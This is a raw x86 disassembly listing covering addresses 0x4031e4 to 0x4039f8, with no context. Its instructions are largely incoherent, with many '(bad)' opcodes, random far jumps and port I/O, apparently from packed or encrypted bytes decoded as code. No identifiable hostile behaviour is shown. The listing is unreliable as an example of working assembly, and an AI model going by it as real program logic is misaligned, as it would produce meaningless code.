  4031e4:	mov    BYTE PTR [esi-0x41daf572],ch
  4031ea:	leave  
  4031eb:	cld    
  4031ec:	dec    esi
  4031ed:	std    
  4031ee:	jmp    0x4b2b05f
  4031f3:	je     0x4031c5
  4031f5:	push   cs
  4031f6:	int    0x6d
  4031f8:	and    ecx,DWORD PTR [ebx-0x40f63c2b]
  4031fe:	arpl   si,bp
  403200:	jecxz  0x40323d
  403202:	ss jle 0x4031fb
  403205:	pop    eax
  403206:	das    
  403207:	jns    0x40326d
  403209:	adc    eax,DWORD PTR [ecx+ebp*4-0x300849eb]
  403210:	jnp    0x4031b7
  403212:	mul    ah
  403214:	cmp    BYTE PTR [eax+0x6a],bh
  403217:	and    DWORD PTR [ecx+0x13fce391],edi
  40321d:	(bad)  
  40321f:	inc    ebx
  403220:	imul   BYTE PTR [ebp-0x1bcdc413]
  403226:	push   0xffffffb2
  403228:	leave  
  403229:	adc    DWORD PTR [ebx-0x4a],ebp
  40322c:	pop    ss
  40322d:	xchg   edi,eax
  40322e:	scas   al,BYTE PTR es:[edi]
  40322f:	mov    ah,0xe5
  403231:	(bad)  
  403232:	pushf  
  403233:	popf   
  403234:	cmp    esp,DWORD PTR [esi+0x67]
  403237:	ret    0x25bb
  40323a:	add    edi,ebp
  40323c:	and    al,BYTE PTR [edi]
  40323e:	in     al,0x4
  403240:	in     eax,0x97
  403242:	inc    edx
  403243:	sub    BYTE PTR [eax],dh
  403245:	iret   
  403246:	mov    al,ds:0xc0bd0c60
  40324b:	push   ss
  40324c:	add    al,0x66
  40324e:	shr    DWORD PTR [eax+0x3f09578e],1
  403254:	loopne 0x4032a7
  403256:	rol    ebp,0xe0
  403259:	xor    esi,esp
  40325b:	inc    edx
  40325c:	mov    ds:0x11b11a18,eax
  403261:	mov    eax,ds:0xcec3dcaf
  403266:	xchg   ebp,eax
  403267:	mov    dl,0x53
  403269:	call   0x2015:0xb24222f7
  403270:	inc    ecx
  403271:	fdivr  QWORD PTR [edi]
  403273:	xchg   esi,eax
  403274:	pop    esi
  403275:	pop    ebp
  403276:	cld    
  403277:	inc    eax
  403278:	xor    BYTE PTR [edx-0xb],0x80
  40327c:	dec    edi
  40327d:	dec    esp
  40327e:	sbb    edx,DWORD PTR [esi]
  403280:	jbe    0x403263
  403282:	fstp   DWORD PTR [edi-0x5e]
  403285:	and    al,0xc5
  403287:	and    ecx,DWORD PTR [edx]
  403289:	ds imul esp,ecx,0x334932a7
  403290:	or     DWORD PTR [edi],0xd3925721
  403296:	ins    DWORD PTR es:[edi],dx
  403297:	pop    ebp
  403298:	mov    ecx,0xea817166
  40329d:	ins    DWORD PTR es:[edi],dx
  40329e:	mov    eax,0x61f56ab8
  4032a3:	mov    ?,WORD PTR [ebp+ebp*4+0x2f9f8134]
  4032aa:	jl     0x403242
  4032ac:	dec    edx
  4032ad:	push   ecx
  4032ae:	mov    bh,0x18
  4032b0:	(bad)  
  4032b1:	aad    0xd2
  4032b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b4:	inc    ebx
  4032b5:	add    DWORD PTR [ebp+0x43],esp
  4032b8:	mov    ebp,0x47a17232
  4032bd:	xchg   DWORD PTR [ebx],ebx
  4032bf:	add    al,0xfc
  4032c1:	sar    BYTE PTR [ebp+0xa201c1f],1
  4032c7:	stc    
  4032c8:	cld    
  4032c9:	pop    esp
  4032ca:	in     eax,0x26
  4032cc:	rcr    esi,cl
  4032ce:	pop    eax
  4032cf:	cmp    ebx,ebx
  4032d1:	xchg   ebx,eax
  4032d2:	sbb    edx,edi
  4032d4:	add    DWORD PTR [eax-0x17],0x5643c688
  4032db:	dec    edi
  4032dc:	leave  
  4032dd:	pop    ss
  4032de:	dec    edx
  4032df:	mov    al,ds:0x69d21a00
  4032e4:	mov    ecx,0x764162ac
  4032e9:	aam    0xe1
  4032eb:	imul   eax,DWORD PTR [edx+0x75015017],0x68
  4032f2:	into   
  4032f3:	or     bl,cl
  4032f5:	jl     0x4032a1
  4032f7:	fmul   DWORD PTR [edi]
  4032f9:	dec    esi
  4032fa:	mov    eax,ds:0x2cc5e4b7
  4032ff:	(bad)  
  403300:	fild   WORD PTR [ecx]
  403302:	push   ss
  403303:	add    DWORD PTR [ebx],eax
  403305:	stos   DWORD PTR es:[edi],eax
  403306:	aam    0x12
  403308:	pop    ecx
  403309:	adc    ebp,DWORD PTR [ecx-0x1fcfe0b3]
  40330f:	(bad)  
  403310:	shr    BYTE PTR [eax+0x77b7a027],1
  403316:	mov    edx,0x44a2d65
  40331b:	fisub  DWORD PTR [ecx-0x581a4156]
  403321:	mov    edi,0x979ff3df
  403326:	inc    eax
  403327:	scas   eax,DWORD PTR es:[edi]
  403328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403329:	pusha  
  40332a:	aas    
  40332b:	mov    dl,0xee
  40332d:	mov    DWORD PTR [edx+0x45],edx
  403330:	sub    cl,BYTE PTR ds:0xf415ac7b
  403336:	sbb    al,0x14
  403338:	mov    WORD PTR [ecx-0x44],fs
  40333b:	and    BYTE PTR [ebx+0x60],0xe9
  40333f:	aaa    
  403340:	mov    bl,0xa0
  403342:	je     0x403386
  403344:	stos   BYTE PTR es:[edi],al
  403345:	es sbb cl,ch
  403348:	into   
  403349:	imul   edx,ecx,0xc
  40334c:	push   eax
  40334d:	jae    0x4033b0
  40334f:	jne    0x4032f6
  403351:	dec    esi
  403352:	jmp    0x25b4:0x263085f8
  403359:	inc    eax
  40335a:	push   ecx
  40335b:	mov    al,0xa2
  40335d:	push   esi
  40335e:	fstp   DWORD PTR [esi-0x70dc4881]
  403364:	out    dx,al
  403365:	or     al,0x1
  403367:	push   ebx
  403368:	fldcw  WORD PTR [edi]
  40336a:	lea    ebx,[eax]
  40336c:	addr16 push es
  40336e:	jecxz  0x4033a3
  403370:	xor    dh,BYTE PTR [eax+0x581b9aff]
  403376:	(bad)  
  403377:	loop   0x403327
  403379:	push   ss
  40337a:	jno    0x403393
  40337c:	ins    DWORD PTR es:[edi],dx
  40337d:	add    ah,BYTE PTR [ebx+0x34]
  403380:	int    0xe8
  403382:	in     al,0x8d
  403384:	sti    
  403385:	fwait
  403386:	jbe    0x403326
  403388:	inc    edx
  403389:	mov    ds:0xa8d82ba0,eax
  40338e:	(bad)  
  403390:	dec    edx
  403391:	ficom  DWORD PTR [ecx-0x11]
  403394:	call   0xa3f72c7
  403399:	add    edi,DWORD PTR [edi+0xc]
  40339c:	push   0xdaca2717
  4033a1:	cdq    
  4033a2:	sti    
  4033a3:	shr    DWORD PTR [edx-0x597bb620],1
  4033a9:	rol    edi,cl
  4033ab:	lods   eax,DWORD PTR ds:[esi]
  4033ac:	and    al,0x5b
  4033ae:	jo     0x403392
  4033b0:	loopne 0x403395
  4033b2:	das    
  4033b3:	mov    bh,0xe2
  4033b5:	add    BYTE PTR [ecx+0xaff3bf1],ah
  4033bb:	or     BYTE PTR fs:[ebp+0x406351bc],ch
  4033c2:	cmp    esi,esp
  4033c4:	shr    DWORD PTR [edi+0xb6267c8],cl
  4033ca:	dec    edx
  4033cb:	fisttp DWORD PTR [ecx]
  4033cd:	repnz arpl WORD PTR [edx],ax
  4033d0:	scas   al,BYTE PTR es:[edi]
  4033d1:	ss fstp st(7)
  4033d4:	(bad)  
  4033d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d6:	and    al,0x5e
  4033d8:	add    BYTE PTR [esi],bh
  4033da:	cli    
  4033db:	xor    dl,al
  4033dd:	pop    eax
  4033de:	ror    al,0x69
  4033e1:	mov    DWORD PTR [edi+0x48],ebx
  4033e4:	fwait
  4033e5:	popf   
  4033e6:	call   0xa9e9a15
  4033eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033ec:	push   es
  4033ed:	mov    ch,0x85
  4033ef:	or     esp,0xffffffe7
  4033f2:	ins    BYTE PTR es:[edi],dx
  4033f3:	jl     0xc1cec52
  4033f9:	setbe  BYTE PTR [ebp-0x30]
  4033fd:	fldcw  WORD PTR [ebp+0x4fac53b1]
  403403:	jo     0x403396
  403405:	xchg   ecx,eax
  403406:	jne    0x4033c8
  403408:	into   
  403409:	cmp    edx,DWORD PTR [ecx+0x8e99ef4]
  40340f:	clc    
  403410:	sbb    eax,DWORD PTR [ebp-0x46]
  403413:	test   DWORD PTR [eax+0x32],ecx
  403416:	rcl    dh,cl
  403418:	nop
  403419:	ds fwait
  40341b:	sbb    al,0x81
  40341d:	stos   BYTE PTR es:[edi],al
  40341e:	add    DWORD PTR [ecx-0x18],edi
  403421:	ror    bh,0xf2
  403424:	adc    bl,BYTE PTR [ebp+esi*1-0xd68745b]
  40342b:	xchg   edx,eax
  40342c:	(bad)  
  40342d:	pop    esp
  40342e:	jmp    0xf54e:0xf2912bc
  403435:	leave  
  403436:	sbb    esi,eax
  403438:	and    cl,bh
  40343a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343b:	data16 mov bl,0x71
  40343e:	push   0x78
  403440:	or     eax,0x4e98876e
  403445:	cmp    ch,BYTE PTR [ebp-0x72]
  403448:	dec    edx
  403449:	jle    0x40347c
  40344b:	sbb    al,0x17
  40344d:	mov    cs,WORD PTR ds:0xec87e0af
  403453:	sub    dh,BYTE PTR [ebp+0x79]
  403456:	jecxz  0x403499
  403458:	xchg   esi,eax
  403459:	mov    ecx,0x1cc0a8ca
  40345e:	fmul   QWORD PTR [ebp-0x66ed8885]
  403464:	xchg   eax,esi
  403466:	out    dx,eax
  403467:	fistp  DWORD PTR [edi]
  403469:	lock (bad) 
  40346b:	arpl   WORD PTR [esi-0x1bb92c3d],si
  403471:	or     BYTE PTR [esi+0x53],cl
  403474:	les    ebp,FWORD PTR [ecx+0x1fd02055]
  40347a:	int3   
  40347b:	sub    al,0xf6
  40347d:	into   
  40347e:	pop    ecx
  40347f:	mov    dl,0xb
  403481:	(bad)  
  403482:	(bad)  
  403483:	pushf  
  403484:	sbb    eax,0x752ae938
  403489:	xor    BYTE PTR [ecx-0x4f],bl
  40348c:	cmp    eax,0xfcd18463
  403491:	add    BYTE PTR [edi],0xbc
  403494:	out    dx,al
  403495:	push   edx
  403496:	popa   
  403497:	retf   0x9887
  40349a:	pop    ebx
  40349b:	fcmove st,st(0)
  40349d:	jmp    0x4034e5
  40349f:	mov    dh,0xb4
  4034a1:	(bad)  
  4034a2:	mov    ebx,0x1450631b
  4034a7:	xor    bh,BYTE PTR [edx-0x18b2f9c6]
  4034ad:	fucomp st(2)
  4034af:	xchg   edi,eax
  4034b0:	add    eax,0x3ce682f3
  4034b5:	pop    esp
  4034b6:	fmulp  st(4),st
  4034b8:	xor    eax,0xa8c22b2e
  4034bd:	loop   0x4034a0
  4034bf:	int3   
  4034c0:	lock int 0xce
  4034c3:	jmp    0xf402:0x28177a69
  4034ca:	or     al,0x10
  4034cc:	cmc    
  4034cd:	sbb    DWORD PTR [ecx],ecx
  4034cf:	cwde   
  4034d0:	(bad)  
  4034d1:	imul   edx,DWORD PTR [edx],0x22
  4034d4:	or     eax,ebx
  4034d6:	mov    al,0x6f
  4034d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d9:	push   eax
  4034da:	add    DWORD PTR [eax+0x3193c8b3],eax
  4034e0:	(bad)
  4034e4:	stc    
  4034e5:	xchg   edx,eax
  4034e6:	sti    
  4034e7:	adc    eax,0xce76b52d
  4034ec:	jo     0x403482
  4034ee:	inc    ebp
  4034ef:	gs jmp 0x4052:0x6de7252d
  4034f7:	pop    edi
  4034f8:	icebp  
  4034f9:	inc    ebx
  4034fa:	mov    edi,0x868b66f6
  4034ff:	mov    al,0x6c
  403501:	je     0x403536
  403503:	add    esi,DWORD PTR [edi-0x22]
  403506:	out    dx,eax
  403507:	adc    al,BYTE PTR ds:0x5843bc8f
  40350d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40350e:	push   esi
  40350f:	mov    edx,0xa591bc7
  403514:	out    dx,al
  403515:	int    0x9f
  403517:	add    DWORD PTR [edi],0x546be4de
  40351d:	test   eax,0xa89160f1
  403522:	out    dx,al
  403523:	mov    ds:0xd74540d7,eax
  403528:	jae    0x4035a1
  40352a:	xor    al,0x5e
  40352c:	sbb    BYTE PTR [eax],0xf9
  40352f:	rcr    BYTE PTR [esi+esi*4],cl
  403532:	xchg   ebp,eax
  403533:	dec    edi
  403534:	inc    ebx
  403535:	pop    ecx
  403536:	ds cmp al,0x42
  403539:	in     al,dx
  40353a:	addr16 jp 0x403578
  40353d:	lods   al,BYTE PTR ds:[esi]
  40353e:	pushw  0xffa8
  403541:	out    dx,eax
  403542:	xor    ebx,DWORD PTR [esp+ebx*2-0x448a38fb]
  403549:	cmp    eax,0xa151eac5
  40354e:	(bad)  
  40354f:	pop    edi
  403550:	adc    DWORD PTR [esp+eiz*2+0x5f],esp
  403554:	mov    esi,0x4bcac608
  403559:	mov    dl,0xbe
  40355b:	ret    
  40355c:	imul   ecx,DWORD PTR [esi+0x6e],0xc1132647
  403563:	and    eax,0x9776bcb4
  403568:	ins    DWORD PTR es:[edi],dx
  403569:	xor    eax,0x655e33fd
  40356e:	sbb    al,0x78
  403570:	faddp  st(0),st
  403572:	or     bh,0x9d
  403575:	jecxz  0x4035d3
  403577:	cwde   
  403578:	mov    ebx,DWORD PTR [esi]
  40357a:	inc    edi
  40357b:	(bad)  
  40357c:	push   eax
  40357d:	adc    BYTE PTR [ebp-0x53f5a967],bh
  403583:	mov    dl,0xc2
  403585:	hlt    
  403586:	adc    eax,0xe962c607
  40358b:	dec    eax
  40358c:	mov    ebx,0x869c2c45
  403591:	sub    eax,0x91e99bc8
  403596:	loop   0x40353a
  403598:	xor    bl,dl
  40359a:	inc    esi
  40359b:	push   cs
  40359c:	mov    dh,0x43
  40359e:	dec    eax
  40359f:	lahf   
  4035a0:	ins    BYTE PTR es:[edi],dx
  4035a1:	xchg   esi,eax
  4035a2:	xchg   BYTE PTR [edi],bh
  4035a4:	ds jge 0x4035f4
  4035a7:	or     edi,DWORD PTR [ebp-0x30921137]
  4035ad:	sub    eax,0xf7a288f8
  4035b2:	ffree  st(0)
  4035b4:	xor    BYTE PTR [edx+edx*1-0x7263a60f],bh
  4035bb:	xor    al,0x8a
  4035bd:	addr16 jo 0x40358e
  4035c0:	sbb    eax,0x404c4477
  4035c5:	lods   eax,DWORD PTR ds:[esi]
  4035c6:	jmp    0x10445355
  4035cb:	icebp  
  4035cc:	pop    ecx
  4035cd:	pop    edx
  4035ce:	aas    
  4035cf:	jnp    0x403575
  4035d1:	out    0x65,eax
  4035d3:	dec    ecx
  4035d4:	sti    
  4035d5:	mov    BYTE PTR [esi],0xc9
  4035d8:	jb     0x40357f
  4035da:	and    ch,ch
  4035dc:	inc    ebx
  4035dd:	push   es
  4035de:	popf   
  4035df:	popa   
  4035e0:	out    dx,eax
  4035e1:	repnz test BYTE PTR [edi-0x7],cl
  4035e5:	inc    ebp
  4035e6:	mov    DWORD PTR ss:[ebx-0x7ce9ca92],eax
  4035ed:	add    eax,0x772bb4
  4035f2:	cwde   
  4035f3:	es fs xchg ecx,eax
  4035f6:	cld    
  4035f7:	add    bl,BYTE PTR [ecx]
  4035f9:	pop    esp
  4035fa:	test   DWORD PTR [ecx-0x41947b11],ebx
  403600:	mov    bh,0x49
  403602:	xor    BYTE PTR [edi-0x3fe7092c],bl
  403608:	inc    ebx
  403609:	out    dx,eax
  40360a:	push   0x67b4ba2e
  40360f:	mov    cl,0x1d
  403611:	in     eax,dx
  403612:	cld    
  403613:	repz lahf 
  403615:	inc    ecx
  403616:	scas   al,BYTE PTR es:[edi]
  403617:	sub    al,bh
  403619:	dec    ecx
  40361a:	retf   
  40361b:	aas    
  40361c:	int    0x8c
  40361e:	push   ds
  40361f:	nop
  403620:	call   0x37e5:0x167e912d
  403627:	dec    edi
  403628:	cmp    BYTE PTR [esi],ch
  40362a:	les    edx,FWORD PTR [edi]
  40362c:	aad    0x3a
  40362e:	add    dl,bl
  403630:	sar    esp,1
  403632:	lods   al,BYTE PTR ds:[esi]
  403633:	dec    ebp
  403634:	inc    esp
  403635:	xchg   ebp,eax
  403637:	inc    esi
  403638:	push   ds
  403639:	bound  ebp,QWORD PTR [edi-0x7c]
  40363c:	and    DWORD PTR [esi-0x58deadca],edi
  403642:	jp     0x4035df
  403644:	out    dx,eax
  403645:	push   ecx
  403646:	out    dx,al
  403647:	ficomp DWORD PTR [esi+edi*4+0x3f481e09]
  40364e:	jmp    0xb13d9038
  403653:	xchg   esi,eax
  403654:	enter  0x16ef,0xa7
  403658:	or     dh,al
  40365a:	(bad)  
  40365b:	sahf   
  40365c:	data16 icebp 
  40365e:	xchg   esi,eax
  40365f:	dec    ebp
  403660:	loope  0x4035ea
  403662:	rol    esp,0xe0
  403665:	cld    
  403666:	jns    0x403652
  403668:	or     cl,BYTE PTR [ebx]
  40366a:	inc    ecx
  40366b:	sbb    bh,bh
  40366d:	into   
  40366e:	pop    ecx
  40366f:	call   0xfaf9194
  403674:	cmc    
  403675:	call   0xd7c0:0x395726a5
  40367c:	mov    ch,0x6c
  40367e:	add    DWORD PTR [eax],esi
  403680:	popa   
  403681:	pand   mm3,QWORD PTR [ecx+eax*2+0x63d0cae8]
  403689:	das    
  40368a:	fwait
  40368b:	(bad)  
  40368c:	call   0x830c7a08
  403691:	fimul  WORD PTR [esi+0x7e831cbc]
  403697:	pop    esi
  403698:	mov    ebx,0x8cbb1155
  40369d:	or     BYTE PTR [ebp-0x67],0xb9
  4036a1:	or     edx,DWORD PTR [eax-0x56]
  4036a4:	dec    ecx
  4036a5:	sar    BYTE PTR [edi+edi*8+0x4f],1
  4036a9:	mov    cl,0x29
  4036ab:	cmp    eax,0x546e2db5
  4036b0:	inc    edi
  4036b1:	pop    es
  4036b2:	push   esi
  4036b3:	lea    eax,[esi+esi*1+0x25697db2]
  4036ba:	mov    ecx,gs
  4036bc:	cmp    esi,DWORD PTR [esi+0x24]
  4036bf:	adc    cl,BYTE PTR [ebp+0x3d979ac5]
  4036c5:	into   
  4036c6:	pop    esi
  4036c7:	xor    eax,0x2a391650
  4036cc:	fcomp  QWORD PTR [esi+edi*1]
  4036cf:	(bad)  
  4036d0:	cmp    eax,0x98c36af8
  4036d5:	jns    0x403667
  4036d7:	addr16 jno 0x403749
  4036da:	call   0x79878477
  4036df:	pop    edx
  4036e0:	inc    esp
  4036e1:	mov    ebx,0x108441f4
  4036e6:	add    eax,0x99cababa
  4036eb:	sub    eax,0xe4f1a57e
  4036f0:	daa    
  4036f1:	mov    ch,0x60
  4036f3:	inc    esp
  4036f4:	ret    0x483c
  4036f7:	jmp    0xcd31:0xc49ce990
  4036fe:	(bad)  
  4036ff:	push   0x1de0ef2c
  403704:	sbb    BYTE PTR [esi],0x31
  403707:	addr16 inc ebp
  403709:	add    BYTE PTR [edx],cl
  40370b:	jmp    0xfd5:0xd2aebede
  403712:	xchg   BYTE PTR [edi+0x22],dl
  403715:	mov    bl,0xba
  403717:	call   0x719e83f2
  40371c:	int3   
  40371d:	inc    edi
  40371e:	jg     0x40378c
  403720:	push   ebx
  403721:	add    DWORD PTR [ebx+0x4],esp
  403724:	les    edi,FWORD PTR [eax-0x21]
  403727:	cmc    
  403728:	fld    QWORD PTR [esp+edx*8+0x11fead94]
  40372f:	mov    cl,0x39
  403731:	cmp    eax,0x8ddee0d3
  403736:	call   0xd35f7af2
  40373b:	loopne 0x403799
  40373d:	mov    dh,0xf3
  40373f:	dec    edi
  403740:	xor    ebx,DWORD PTR [ebp-0x7cbba2ba]
  403746:	mov    ds:0xedc3d830,eax
  40374b:	sub    al,0x3c
  40374d:	cmp    eax,0x98577a25
  403752:	jns    0x4036df
  403754:	xlat   BYTE PTR ds:[ebx]
  403755:	sbb    eax,0x24062ec2
  40375a:	sbb    eax,DWORD PTR [ebx]
  40375c:	xchg   edx,eax
  40375d:	jle    0x4036e7
  40375f:	gs inc edi
  403761:	or     bh,0xab
  403764:	jno    0x40375f
  403766:	mov    BYTE PTR ds:0xbae0c850,dh
  40376c:	pop    edx
  40376d:	dec    sp
  40376f:	jo     0x4037ee
  403771:	(bad)  
  403772:	xchg   edi,eax
  403773:	add    al,0x45
  403775:	add    eax,0xcd2902cc
  40377a:	repz rcl DWORD PTR es:[esi+0x57],0x10
  403780:	sahf   
  403781:	mov    eax,ds:0x237519ba
  403786:	inc    esi
  403787:	sbb    al,0xb5
  403789:	test   eax,0xce9de27c
  40378e:	cmp    DWORD PTR [eax],edx
  403790:	push   eax
  403791:	push   esi
  403792:	aas    
  403793:	call   0x55d6:0x70d03be0
  40379a:	mov    ds:0x25b97f76,al
  40379f:	mov    esp,0x5befec89
  4037a4:	push   ecx
  4037a5:	ds mov ch,0xfd
  4037a8:	push   edi
  4037a9:	ins    BYTE PTR es:[edi],dx
  4037aa:	pushf  
  4037ab:	mov    dh,0xbf
  4037ad:	mov    eax,0xfe2ebbb7
  4037b2:	dec    edx
  4037b3:	neg    al
  4037b5:	mov    bh,0x78
  4037b7:	aad    0xf2
  4037b9:	int    0x97
  4037bb:	stos   DWORD PTR es:[edi],eax
  4037bc:	xor    eax,ebx
  4037be:	addr16 js 0x4037d9
  4037c1:	mov    ah,0xb7
  4037c3:	sbb    ch,BYTE PTR ds:0x5b55d619
  4037c9:	or     al,0xb8
  4037cb:	sub    dh,bl
  4037cd:	xor    ah,ch
  4037cf:	leave  
  4037d0:	jecxz  0x403770
  4037d2:	jmp    0x403834
  4037d4:	push   esi
  4037d5:	enter  0x50ba,0x9d
  4037d9:	leave  
  4037da:	(bad)  
  4037db:	jo     0x40380c
  4037dd:	mov    BYTE PTR ds:0x2f586e4b,dh
  4037e3:	pop    es
  4037e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037e5:	dec    ebp
  4037e6:	fstp   st(2)
  4037e8:	xor    eax,0xe400775b
  4037ed:	aaa    
  4037ee:	scas   eax,DWORD PTR es:[edi]
  4037ef:	mov    ebp,0x4f277688
  4037f4:	mov    ebp,0xc7c8c5f4
  4037f9:	cwde   
  4037fa:	xor    DWORD PTR [ebp+0x58d8553d],0x20
  403801:	add    al,0x4b
  403803:	cmp    dl,BYTE PTR [edx]
  403805:	adc    eax,0xab93b1a1
  40380a:	imul   edi,ecx,0xac17ced4
  403810:	in     al,0xc2
  403812:	push   esp
  403813:	sbb    DWORD PTR [esp+ebp*4+0x7c],edi
  403817:	push   ds
  403818:	mov    edi,0xc79d3c39
  40381d:	cmp    DWORD PTR [esi],ecx
  40381f:	sbb    BYTE PTR [edx-0x3662a77f],0x62
  403826:	push   edi
  403827:	inc    edi
  403828:	pop    esi
  403829:	inc    ebp
  40382a:	in     al,0x9b
  40382c:	rcl    BYTE PTR [edx+0x57c62711],1
  403832:	and    BYTE PTR [esi+0x4286378e],bl
  403838:	fs jge 0x403839
  40383b:	jae    0x4037ca
  40383d:	(bad)  
  40383e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40383f:	or     ebx,DWORD PTR [ecx+0x25]
  403842:	dec    esi
  403843:	jl     0x403861
  403845:	or     DWORD PTR [ebx-0x20],0xffffffb1
  403849:	push   cs
  40384a:	add    eax,0x863a4ffa
  40384f:	or     al,BYTE PTR [eax]
  403851:	sti    
  403852:	not    BYTE PTR [ebp-0x35cf22d1]
  403858:	cmp    DWORD PTR [eax+0x493968f],ebx
  40385e:	shl    DWORD PTR [ebx+0x1916bd98],cl
  403864:	pop    ds
  403865:	push   es
  403866:	cli    
  403867:	(bad)  
  403868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403869:	xchg   bl,bl
  40386b:	stos   DWORD PTR es:[edi],eax
  40386c:	and    DWORD PTR [eax],0xdc476387
  403872:	pusha  
  403873:	xchg   DWORD PTR [ebp+0xe4dd498],ecx
  403879:	push   ebx
  40387a:	cmp    BYTE PTR [esi+0x69a23e06],dl
  403880:	(bad)  
  403881:	dec    DWORD PTR [esi]
  403883:	inc    ebp
  403884:	aaa    
  403885:	push   ebp
  403886:	lea    edi,[ebx]
  403888:	jg     0x403886
  40388a:	clc    
  40388b:	in     al,dx
  40388c:	dec    esi
  40388d:	mov    ds:0x4e6f1367,al
  403892:	enter  0x4b7,0x7a
  403896:	call   0x730472c9
  40389b:	pushf  
  40389c:	xchg   ebx,eax
  40389d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40389e:	inc    esi
  40389f:	xor    BYTE PTR [esi-0x40],ah
  4038a2:	inc    ecx
  4038a3:	jecxz  0x40385c
  4038a5:	mov    ah,0x43
  4038a7:	gs out dx,al
  4038a9:	lock stc 
  4038ab:	xchg   edx,eax
  4038ac:	ins    BYTE PTR es:[edi],dx
  4038ad:	xor    eax,0x7b42f915
  4038b2:	adc    esi,DWORD PTR [edi-0x39e1c34a]
  4038b8:	sub    BYTE PTR [ebx],ch
  4038ba:	pop    ss
  4038bb:	aad    0xe3
  4038bd:	or     eax,edx
  4038bf:	xchg   edx,eax
  4038c0:	xor    eax,0x5af3e05f
  4038c5:	call   0xb1e284e2
  4038ca:	inc    ecx
  4038cb:	push   edi
  4038cc:	pop    edi
  4038cd:	pusha  
  4038ce:	cli    
  4038cf:	clc    
  4038d0:	mov    ebx,0xea110467
  4038d5:	or     eax,0x6268210b
  4038da:	fld    TBYTE PTR [edx]
  4038dc:	push   edi
  4038dd:	mov    ebp,0xc519c6e6
  4038e2:	in     al,0x6d
  4038e4:	cld    
  4038e5:	cs aam 0xc9
  4038e8:	nop
  4038e9:	mov    eax,0x3c4fe6e0
  4038ee:	enter  0x69d2,0xd4
  4038f2:	pop    edx
  4038f3:	add    ecx,esi
  4038f5:	sar    DWORD PTR [edx+eiz*2+0x24],0xb
  4038fa:	sub    dh,BYTE PTR [edi]
  4038fc:	xchg   ebp,eax
  4038fd:	push   cs
  4038fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ff:	pop    edx
  403900:	call   0x8a5f:0x79cf38d1
  403907:	inc    edi
  403908:	ins    DWORD PTR es:[edi],dx
  403909:	dec    esi
  40390a:	mov    al,0xfd
  40390c:	sbb    dh,dh
  40390e:	adc    eax,edx
  403910:	jns    0x403970
  403912:	shl    ebx,cl
  403914:	out    dx,al
  403915:	dec    esp
  403916:	test   DWORD PTR [edx],ebp
  403918:	arpl   WORD PTR [ecx-0x42],si
  40391b:	pop    DWORD PTR [eax+eiz*4]
  40391e:	ror    DWORD PTR [edi+ebx*4+0x24c89bd5],cl
  403925:	mov    edx,0xb883b29
  40392a:	loopne 0x403981
  40392c:	loope  0x40394a
  40392e:	cdq    
  40392f:	sub    eax,0xff2a4397
  403934:	cmp    BYTE PTR [eax],bl
  403936:	in     eax,dx
  403937:	cld    
  403938:	mov    eax,0x61c85a23
  40393d:	jecxz  0x4039b9
  40393f:	retf   
  403940:	push   0x60
  403942:	pusha  
  403943:	popa   
  403944:	mov    ch,0x4c
  403946:	into   
  403947:	add    DWORD PTR [ebx-0x5],ebp
  40394a:	cmp    DWORD PTR [eax],ecx
  40394c:	adc    eax,0xdab06d77
  403951:	sbb    ah,0xe2
  403954:	xlat   BYTE PTR ds:[ebx]
  403955:	enter  0x4fb6,0x78
  403959:	add    BYTE PTR [esi],ch
  40395b:	pop    edi
  40395c:	sub    ecx,esi
  40395e:	js     0x4039d1
  403960:	dec    ecx
  403961:	or     eax,DWORD PTR [edi]
  403963:	jmp    0xd817:0x244ef2d2
  40396a:	xor    edx,edx
  40396c:	xor    dl,dh
  40396e:	push   es
  40396f:	fsubr  QWORD PTR [edi]
  403971:	es xchg edx,eax
  403973:	iret   
  403974:	out    0x56,al
  403976:	into   
  403977:	mov    al,ds:0x2d2f3c34
  40397c:	sub    eax,DWORD PTR [eax+0x33caee28]
  403982:	pop    ds
  403983:	lods   eax,DWORD PTR ds:[esi]
  403984:	mov    ds,WORD PTR [eax+ecx*4+0x77836c88]
  40398b:	arpl   WORD PTR [esi],sp
  40398d:	mov    dh,0x52
  40398f:	or     al,bl
  403991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403992:	pop    edi
  403993:	outs   dx,DWORD PTR ds:[esi]
  403994:	xor    eax,0x6f0ee738
  403999:	sub    eax,0xd3ffb4
  40399e:	and    ah,BYTE PTR [eax-0x4b]
  4039a1:	mov    ebx,0xde42569e
  4039a6:	push   ebp
  4039a7:	cmp    al,0x67
  4039a9:	xchg   esi,eax
  4039aa:	adc    al,0x92
  4039ac:	add    eax,0xee069045
  4039b1:	scas   eax,DWORD PTR es:[edi]
  4039b2:	and    dl,BYTE PTR [ecx-0x3a]
  4039b5:	add    bl,BYTE PTR [ecx]
  4039b7:	sub    dh,dh
  4039b9:	fild   WORD PTR ds:0xa01f02d
  4039bf:	ffreep st(2)
  4039c1:	test   bl,dl
  4039c3:	and    BYTE PTR [ecx],al
  4039c5:	ds in  al,0x76
  4039c8:	push   es
  4039c9:	in     al,dx
  4039ca:	or     eax,0x98f717cf
  4039cf:	aaa    
  4039d0:	aad    0xe4
  4039d2:	lock test BYTE PTR [esi+0x38],cl
  4039d6:	fwait
  4039d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d8:	cmps   WORD PTR fs:[esi],WORD PTR es:[edi]
  4039db:	sub    bl,BYTE PTR [ebp-0x7613f893]
  4039e1:	dec    esp
  4039e2:	adc    ecx,ecx
  4039e4:	inc    esp
  4039e5:	je     0x403a08
  4039e7:	data16 fdivr QWORD PTR [ecx*8-0x7c7fd4d6]
  4039ef:	jge    0x4039d1
  4039f1:	xchg   edx,eax
  4039f2:	mov    eax,ss:0xe3f286e7
  4039f8:	mov    esi,0xecb2f3f4
